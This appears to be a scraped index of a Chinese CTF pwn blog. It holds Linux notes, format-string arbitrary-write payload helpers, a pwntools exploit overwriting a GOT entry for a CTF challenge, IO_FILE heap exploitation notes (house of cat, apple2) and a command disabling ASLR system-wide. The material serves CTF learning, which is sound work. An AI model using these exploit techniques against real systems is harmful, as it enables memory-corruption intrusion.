scp -r www.runoob.com :/home/root/others/ /home/space/music/ wsl中用scp zzzp@192.168.76.131 :/var/www/html/user_dashboard.php /mnt/c/users/zp/desktop/ git bash中scp 192.168.76.131:/var/www/html/register.php /c/Users/ZP/Desktop/ 说明 如果远程服务器防火墙为scp命令设置了指定的端口，我们需要使用-P参数来设置命令的端口号，命令格式如下 //scp 命令使用端口号 4588 scp -P 4588 remote@www.runoob.com :/usr/local/sin.sh /home/administrator 使用scp命令要确保使用的用户具有可读取远程服务器相应文件的权限，否则scp命令是无法作业的</content></entry><entry><title>杂乱的知识点</title><url>/post/linux-basic-knowledge/%E6%9D%82%E4%B9%B1%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</url><categories><category>Linux Basic Knowledge</category></categories><tags/><content type="html"> [TOC]
gdb关闭本地alsr 参考此篇博客 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 上面那个直接关闭本地整个的alsr set disable-randomization on show disable-randomization sudo -s echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space exit 文件路径 “/”在系统文件中表示绝对路径： “/”处于Linux文件系统树形结构的最顶端，我们称它为Linux文件系统的root，它是Linux文件系统的入口； 所有的目录、文件、设备都在“/”之下，它是Linux文件系统最顶层的唯一的目录； 一般建议在根目录下面只有目录，不要直接存放文件； 根目录是linux系统启动时系统第一个载入的分区，所以启动过程中用到的文件应该都放在这个分区中； 其中/etc、/bin、/dev、/lib、/sbin这5个子目录都应该要与根目录连在一起，不可独立成为某个分区。
“./” 代表的意思是： ./ 代表当前文件目录，某一个文件（或者目录）的查找路径是从当前目录“.”下面开始进行查找。
“..” 代表的意思是： “..”表示上级目录
“pwd ” 代表的意思是： pwd 命令显示当前位置的完整路径名。
文件描述符 变量大小 DB 定义的变量为字节型 Define Byte DW 定义的变量为字类型（双字节）Define Word DD 定义的变量为双字型（4字节）Define Double Word DQ 定义的变量为4字型（8字节）Define Quadra Word
环境变量 echo $PATH 可以打印环境变量
当通过环境变量寻找一个指令并使用时，有时候一个软件会有不同的版本，在环境变量列表中出现得更早，系统会优先使用该路径下的指令 PATH 打印出的内容是以冒号 : 分割的。在Linux和类Unix系统中，冒号 : 用作环境变量值中各个目录的分隔符。 符号链接 zp9080@LAPTOP-N2IL3LVK:~$ ls -l /usr/bin/opt lrwxrwxrwx 1 root root 22 Apr 2 2022 /usr/bin/opt -&amp;gt; ../lib/llvm-14/bin/opt 输出的内容/usr/bin/opt 是一个符号链接，指向 /usr/lib/llvm-14/bin/opt。因此，系统会默认使用 /usr/lib/llvm-14/bin/opt 版本的 opt 命令 可用sudo ln -sf /usr/lib/llvm-12/bin/opt /usr/bin/opt 修改符号链接 符号链接（Symbolic Link），也被称为软链接（Soft Link），是一种特殊类型的文件，它包含了另一个文件的路径。在Linux和类Unix系统中，符号链接是一种常见的文件系统对象，用于创建一个指向另一个文件或目录的引用。 符号链接与硬链接（Hard Link）不同，硬链接直接指向文件的物理存储位置，而符号链接则是指向文件路径。符号链接的创建和使用相对简单，它们可以跨越文件系统边界，允许链接到不同的文件系统中的文件，而硬链接只能存在于同一文件系统中。</content></entry><entry><title>栈对齐</title><url>/post/stackoverflow/%E6%A0%88%E5%AF%B9%E9%BD%90/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> 高版本的Ubuntu执行system或者printf需要高16位栈对齐 一般的做法就是垫一个ret或者不要system完整函数里面的pop rbp
后来做题又发现C++异常处理throw函数里面的有个函数也需要栈对齐，因此栈对齐在很多函数中都有可能需要，此时也不必纠结。gdb -c core发现后垫上一个ret就可以了</content></entry><entry><title>栈上格式化字符串</title><url>/post/format-string/%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url><categories><category>PWN</category><category>Format-String</category></categories><tags><tag>栈上格式化字符串</tag></tags><content type="html"><![CDATA[  往栈上某个地址一次写入6个字节 #target是目标地址，n0是想要写入的东西,k为ljust之后p64(target)为格式化字符串的第几个参数 def write_target(target, n0,k): n1 = n0&amp;0xffff n2 = (n0&gt;&gt;16)&amp;0xffff n3 = (n0&gt;&gt;32)&amp;0xffff #6种情况 #n1&gt;n2&gt;n3 if n1&gt;n2 and n1&gt;n3 and n2&gt;n3: payload=(f&#39;%{n3}c%{k+2}$hn%{n2-n3}c%{k+1}$hn%{n1-n2}c%{k}$hn&#39;.ljust(40,&#39;a&#39;)).encode()+p64(target)+p64(target+2)+p64(target+4) return payload #n1&gt;n3&gt;n2 elif n1&gt;n2 and n1&gt;n3 and n3&gt;n2: payload=(f&#39;%{n2}c%{k+1}$hn%{n3-n2}c%{k+2}$hn%{n1-n3}c%{k}$hn&#39;.ljust(40,&#39;a&#39;)).encode()+p64(target)+p64(target+2)+p64(target+4) return payload #n2&gt;n1&gt;n3 elif n2&gt;n1 and n2&gt;n3 and n1&gt;n3: payload=(f&#39;%{n3}c%{k+2}$hn%{n1-n3}c%{k}$hn%{n2-n1}c%{k+1}$hn&#39;.ljust(40,&#39;a&#39;)).encode()+p64(target)+p64(target+2)+p64(target+4) return payload #n2&gt;n3&gt;n1 elif n2&gt;n1 and n2&gt;n3 and n3&gt;n1: payload=(f&#39;%{n1}c%{k}$hn%{n3-n1}c%{k+2}$hn%{n2-n3}c%{k+1}$hn&#39;.ljust(40,&#39;a&#39;)).encode()+p64(target)+p64(target+2)+p64(target+4) return payload #n3&gt;n2&gt;n1 elif n3&gt;n1 and n3&gt;n2 and n2&gt;n1: payload=(f&#39;%{n1}c%{k}$hn%{n2-n1}c%{k+1}$hn%{n3-n2}c%{k+2}$hn&#39;.ljust(40,&#39;a&#39;)).encode()+p64(target)+p64(target+2)+p64(target+4) return payload #n3&gt;n1&gt;n2 elif n3&gt;n1 and n3&gt;n2 and n1&gt;n2: payload=(f&#39;%{n2}c%{k+1}$hn%{n1-n2}c%{k}$hn%{n3-n1}c%{k+2}$hn&#39;.ljust(40,&#39;a&#39;)).encode()+p64(target)+p64(target+2)+p64(target+4) return payload 写入4个字节 def write1(target, n0,k=12): n1 = n0&amp;0xffff n2 = (n0&gt;&gt;16)&amp;0xffff if(n1&gt;n2): payload=(f&#39;%{n2}c%{k+1}$hn%{n1-n2}c%{k}$hn&#39;.ljust(0x30,&#39;a&#39;)).encode()+p64(target)+p64(target+2) else: payload=(f&#39;%{n1}c%{k+1}$hn%{n2-n1}c%{k}$hn&#39;.ljust(0x30,&#39;a&#39;)).encode()+p64(target+2)+p64(target) return payload   ]]></content></entry><entry><title>栈溢出</title><url>/post/c++-pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/</url><categories><category>PWN</category><category>C++ Pwn</category></categories><tags><tag>c++ pwn</tag></tags><content type="html"><![CDATA[   例题 SICTF ROUND3 overflow 漏洞在这里，cin是不限制读入长度的，但是要注意不要用space,\n，那么operator=就相当于任意写，而buf又在栈上，把它覆盖为一个target_addr就可以任意地址写入 ida反汇编有点小问题，应当是operator&raquo;(&amp;cin,v3) std::string::operator=(buf, v3) buf位置在哪直接动调看一眼就知道了，根据这个设置pad长度 最终效果 from pwn import * from pwnlib.util.packing import p64 from pwnlib.util.packing import u64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) file=&#34;/home/zp9080/PWN/pwn&#34; # p = process(file) p=gdb.debug(file,&#39;b *0x4012E7 &#39;) backdoor = 0x4011d0 chk_got = 0x404018 #gdb.attach(p) p.recvuntil(b&#39;?\n&#39;) payload = p64(backdoor) + b&#39;b&#39; * 0xa0 + p64(chk_got) p.sendline(payload.ljust(0x150, b&#39;a&#39;)) p.interactive()   ]]></content></entry><entry><title>知识学习</title><url>/post/c++-pwn/%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url><categories><category>PWN</category><category>C++ Pwn</category></categories><tags><tag>c++ pwn</tag></tags><content type="html"><![CDATA[   C++知识点 *
__int64 v1; // rax v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &#34;What do you want to say?&#34;); std命名空间，operator&laquo;是重载运算符函数，&laquo;&lt;std::char_traits&gt;是template里面的东西可以不管，rdi=&amp;std::cout,rsi=&ldquo;What do you want to say?&ldquo;的地址 返回值rax=&amp;std::cout
.text:00000000004012FB mov rdi, cs:_ZSt3cin_ptr .text:0000000000401302 lea rsi, [rbp+var_50] .text:0000000000401306 mov [rbp+var_60], rsi .text:000000000040130A call _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ ; std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(std::istream &amp;,char*) operator&raquo;也是一个重载运算符函数，&raquo;流运算符，rdi=&amp;std::cin,rsi=rbp+var_50,相当于输入函数，将&amp;std::cin的内容输入到rbp+var_50,返回值rax=&amp;std::cin
  ]]></content></entry><entry><title>最常用的house攻击</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84house%E6%94%BB%E5%87%BB/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>最常用的house攻击</tag></tags><content type="html"><![CDATA[  [TOC]
经验总结 _IO_list_all,IO_2_1_stderr,stderr看情况写哪个 FROP打house of apple2,malloc_assert打house of cat 题目没有sandbox就最好不打orw 注意FROP还有个条件要满足
1. _IO_list_all写入一个可控堆地址 2. FAKE FILE+0x88(_IO_lock_t *_lock)的值=writable addr 3. FAKE FILE+0xc0(fp-&amp;gt;_mode)的值=0 4. FAKE FILE+0x28的值&amp;gt;FAKE FILE+0x20的值（fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_write_base） 调试断点 b *&amp;amp;_IO_cleanup b *&amp;amp;_IO_flush_all b *&amp;amp;_IO_flush_all_lockp b *&amp;amp;_IO_flush_all_lockp+223 b *&amp;amp;_IO_wfile_seekoff b *&amp;amp;_IO_switch_to_wget_mode 一个小技巧：有时候题目给的libc是没有符号表的，难以调试，可以从glibc-all-in-one中找到有符号表的同样版本的libc，这样有符号表，pwndbg更好有断点进行调试
house of cat house of cat在_IO_switch_to_wget_mode可以设置rdx,随后调用setcontent+61可以直接进行orw，不用magic gadget 但是house of cat需要控制rcx不为0，在malloc_assert的时候可以满足，dbg时发现FSOP不能满足，此时建议打apple2 house of cat在elf文件中stderr会先用elf文件中的而不是libc中的stderr 可以打IO_2_1_stderr 只能打orw,因为后面程序都dump了 对应设置如下
_lock = writable address,_mode = 0 fake_file+0xa0也就是wide_data设置为一个堆地址 fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; …  ]]></content></entry><entry><title>做题遇到的函数</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E5%81%9A%E9%A2%98%E9%81%87%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[  [TOC]
strtoull函数 munmap函数 setvbuf函数 fgets函数 char *fgets(char *str, int n, FILE *stream); fgets() 从 stream 中读取字符，直到读取了 n-1 个字符、读取并转移到字符串的换行符 (&amp;rsquo;\n&amp;rsquo;)，或者遇到文件结束 (EOF) 条件为止。如果读取到换行符，则包含在字符串中。在读取的最后一个字符后添加了一个空终止符 (&amp;rsquo;\0&amp;rsquo;)，因此生成的字符串是以空终止的。 mmap函数 void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); addr：指定映射的起始地址，通常为NULL，让操作系统自动选择合适的地址。 length：指定映射的长度，以字节为单位。 prot：指定映射区域的保护方式，prot=7表示可读可写可执行 flags：用于控制映射的选项，flags=34(0x22)表示MAP_SHARED | MAP_PRIVATE，映射可以同时被多个进程共享，但每个进程都有自己的私有映射。 fd：如果是从文件映射，需要指定文件描述符，设置为0即为stdin offset：指定文件映射的偏移量，通常设置为0表示从文件的开头开始映射。一般设置为0
scanf函数 在C语言中，scanf 函数是用于从标准输入（通常是键盘）读取输入数据的函数。scanf 函数的执行会一直等待用户输入，直到发生以下情况之一，才会停止： 1.遇到空白字符（空格、制表符、换行符等）： scanf 在默认情况下使用空白字符作为输入项的分隔符。当用户输入空白字符时，scanf 会将其视为输入项的结束，并将已读取的内容赋给相应的变量。 2.达到指定的格式控制符（例如 %d, %f 等）： scanf 根据格式控制符指定的格式来读取输入。当输入的内容与格式控制符不匹配时，scanf 会停止。 所以当我们不想改变一个地方原本的值的时候，输入不符合格式就好了,这点我们可以利用来泄露出一些东西，比如可以泄露一些函数的地址这样我们可以得到Libcbase 3.到达文件尾（EOF）： 如果输入流（例如文件或标准输入）已经结束，scanf 会返回 EOF，表示文件结束， …  ]]></content></entry><entry><title/><url>/about/</url><categories/><tags/><content type="html"> 关于我 欢迎来到我的博客！我是一名WHUCTF的一名Pwn手，在二进制这个领域，我始终保持着对新挑战的渴望和热情。
个人理念 对我而言，Pwn不仅仅是一种技能，更是一种艺术。每一次挑战都是对自我的超越。在我的博客中，你将找到我在Pwn旅程中的经验分享、技术文章和一些实用的技巧。
此外，我也对一切有意思的东西保持着浓厚的兴趣，这些领域的探索使我能够从不同角度解决问题，拓宽视野。
我还持续关注行业内的前沿技术和新兴趋势，努力将最新的知识和实践融入到我的学习和研究中。
我欢迎同行和技术爱好者与我交流探讨，一起推动技术的进步和应用。
欢迎交流和探讨，我的常用邮箱:1249814975@qq.com</content></entry></search>